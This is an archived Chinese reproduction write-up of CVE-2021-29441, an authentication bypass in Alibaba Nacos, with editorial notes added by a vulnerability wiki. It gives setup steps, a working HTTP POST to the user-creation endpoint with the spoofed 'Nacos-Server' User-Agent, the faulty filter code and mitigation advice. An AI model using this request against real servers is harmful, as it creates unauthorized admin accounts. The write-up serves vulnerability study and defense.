---
version: "原归档声称 Alibaba Nacos ≤2.0.0-ALPHA.1；2.0.0-ALPHA.1 是所列实验版本，修复版本未给。"
source: "MrWQ/vulnerability-paper"
title: "Alibaba Nacos 权限认证绕过漏洞复现"
product: "Alibaba Nacos认证过滤"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2021-29441"
referenced_identifiers: ""
identifier_role: "primary"
cve: "CVE-2021-29441"
prerequisites: "受影响UA白名单机制启用、API可达；实验2.0.0-ALPHA.1"
affected_versions: "原归档声称 Alibaba Nacos ≤2.0.0-ALPHA.1；2.0.0-ALPHA.1 是所列实验版本，修复版本未给。"
source_url: "https://mp.weixin.qq.com/s/6IxFrlMrUWCd5qvVOVrcvw"
source_status: "recorded"
side_effects: "含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。"
id: "vw-3bff7c5f3ccb616ba046fae3"
entity_id: "ve-3bff7c5f3ccb616ba046fae3"
schema_version: "1"
previous_version: "参考链接："
previous_affected_versions: "参考链接："
---

# Alibaba Nacos 权限认证绕过漏洞复现

> 版本字段校订（2026-10-04）：误填的版本字段原值逐字保存到对应 `previous_*` 字段。当前值区分正文声称的影响范围、实验环境与尚未知的范围；后文对该元数据误填的旧说明只描述校订前状态，未据此升级来源结论。

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：受影响UA白名单机制启用、API可达；实验2.0.0-ALPHA.1
- 证据范围：创建新用户并登录是有状态演示；所引TrafficReviseFilter仅一层filter放行不足以单独证明全部鉴权被绕过，应核AuthFilter

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- version抽取为参考链接：，缺主CVE
- 第一处usename拼错，Content-Type form-urlencode少d
- 无UA首次用户列表就能读可能是未启用认证，需明确基线/对照
- 200不单独证明创建成功；修复版本未给

### 操作风险与资料使用

- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6IxFrlMrUWCd5qvVOVrcvw)

  

**上方蓝色字体关注我们，一起学安全！**

**作者：****Menge & 银空飞羽**

**本文字数：1157**

**阅读时长：3～4min**

**声明：请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

Nacos（官方网站：http://nacos.io）是一个易于使用的平台，旨在用于动态服务发现，配置和服务管理。它可以帮助您轻松构建云本机应用程序和微服务平台。  

**0x02 漏洞概述**  

  

2020 年 12 月 29 日，Nacos 官方在 github 发布的 issue 中披露 Alibaba Nacos 存在一个由于不当处理 User-Agent 导致的未授权访问漏洞 。通过该漏洞，攻击者可以进行任意操作，包括创建新用户并进行登录后操作。  

**0x03 影响版本**  

  

Nacos <= 2.0.0-ALPHA.1  

**0x04 环境搭建**  

  

Nacos 下载地址 (github):  

```
https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaxIDicSEMibuVckvqC9RPNRCknDufVpuz9R8TO9icn51WJ9nCY9jDmb2I9fT5AZYdR8zOTibWt88Iu0Q/640?wx_fmt=png)  

【**Linux 搭建**】

下载好后解压文件

```
tar -zxvf nacos-server-2.0.0-ALPHA.1.tar.gz
```

  
进入目录，执行搭建命令

```
./startup.sh -m standalone
```

  
【**Windows 搭建**】  

解压进入目录后执行搭建命令

```
cmd startup.cmd -m standalone
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaxIDicSEMibuVckvqC9RPNRCBLSuWBQqG06kBYBWto4ZgibZP11IGs0MejX7Wpxia1Gr9YAcYkL0cPJg/640?wx_fmt=png)  

接着访问 http://your-ip:8848/nacos

默认账号密码 nacos/nacos  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaxIDicSEMibuVckvqC9RPNRCDibGKwYPGDHMqPhz1SL4cj3IzDXicerMRyANicf7OjSRE7ztZ5TRb7Lew/640?wx_fmt=png)  
出现 Nacos 登录页面则表示搭建成功  

**0x05 漏洞复现**  

  

访问  

```
http://your-ip:8848/nacos/v1/auth/users?pageNo=1&pageSize=1
```

  
可以查看到用户列表  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaxIDicSEMibuVckvqC9RPNRCOy65z4YW5krq3bSnpRBtlv929Q5SZM64YyTQJJbWB8XAsNmUKWxBgg/640?wx_fmt=png)

  
从上图可以发现，目前有一个用户 nacos

漏洞利用，访问

```
http://your-ip:8848/nacos/v1/auth/users
```

  
POST 传参：  

```
usename=test1&password=test1
```

  
修改 UA 头为 Nacos-Server

发送 POST 请求，返回码 200，创建用户成功~！  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaxIDicSEMibuVckvqC9RPNRC79jfB6ibsV3LbmUCGcMhv4fz60RkNdQp86uo8vJfA5lroM3qOicrcoTw/640?wx_fmt=png)

  
返回 Nacos 登录界面 test1/test1

登录成功！  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaxIDicSEMibuVckvqC9RPNRCe1iaAKvcaugHzXhEkffQbpzLgV4V7BA9icqSWzNicYqUqiczRic4ftCuabQ/640?wx_fmt=png)

  
或者直接用 burp 打，构造数据包 poc 如下：

```http
POST /nacos/v1/auth/users HTTP/1.1
Host:your-ip:8848
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Nacos-Server
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencode
Content-Length: 27

username=test&password=test
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaxIDicSEMibuVckvqC9RPNRCEkwLcJlX3z2iaN4NHqo76dzGrYOs0icj8I5R2v6HIEickCnia3wCqVokBg/640?wx_fmt=png)

  
利用成功！

**0x06 漏洞分析**  

  

首先，入口点我们看一下 github 上相关 issues 的讨论  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaxIDicSEMibuVckvqC9RPNRCdFMRX6oBDJB6Xm3z5u6oPzYaQCD9JG9PzLXC2phVWoXtPcDIibSz1eA/640?wx_fmt=png)

别的不做讨论，只关注漏洞。  

根据提出漏洞的大佬 threedr3am 描述，这个 Nacos-Server 是用来进行服务间的通信的白名单。比如服务 A 要访问服务 B，如何知道服务 A 是服务，只需要在服务 A 访问服务 B 的时候 UA 上写成 Nacos-Server 即可。  

正因为这样，所以当我们 UA 恶意改为 Nacos-Server 的时候，就会被误以为是服务间的通信，因此在白名单当中，绕过的认证。  

这里用的是 nacos-2.0.0-ALPHA.1 的代码进行分析

关键代码在该文件下  

```
/nacos-2.0.0-ALPHA.1/naming/src/main/java/com/alibaba/nacos/naming/web/TrafficReviseFilter.java
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaxIDicSEMibuVckvqC9RPNRCygeIhN5QMBDU2GIjcc5rIXaqhUH0Fg1Idia8envbJHficoyX1yTYGTqg/640?wx_fmt=png)

TrafficReviseFilter 继承了 Filter 用来处理请求，而里面的 doFilter 的就很明确了。注释中写道，当接收到其他节点服务的请求时应该被通过，如何验证是其他服务。  

就是下面很简单的一个对于 UA 的一个判断逻辑

```
if (StringUtils.startsWith(agent, Constants.NACOS_SERVER_HEADER)) {
            filterChain.doFilter(req, resp);
            return;
        }
```

这个 Constants.NACOS_SERVER_HEADER 跟踪一下，正是 Nacos-Server  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaxIDicSEMibuVckvqC9RPNRCwfeyfsOn9UKk3Ik9jQTHtUtA8zlIgFl4fm7PbyLFORuEW3ydztdugA/640?wx_fmt=png)

经过这一层的验证，那么则进入到 filterChain 过滤器链中的下一个 filter 过滤器，继续接下来的请求。

**0x07 修复方式**  

  

若业务环境允许，使用白名单限制相关 web 项目的访问来降低风险。

官方已发布最新安全版本，请及时下载升级至安全版本。

```
参考链接：
```

https://blog.csdn.net/xuandao_ahfengren/article/details/112724542

https://mp.weixin.qq.com/s/YokFDDAPKQwMmXJs5oMCEg

https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=3549

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章  
**

Timeline Sec 团队  

安全路上，与你并肩前行

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
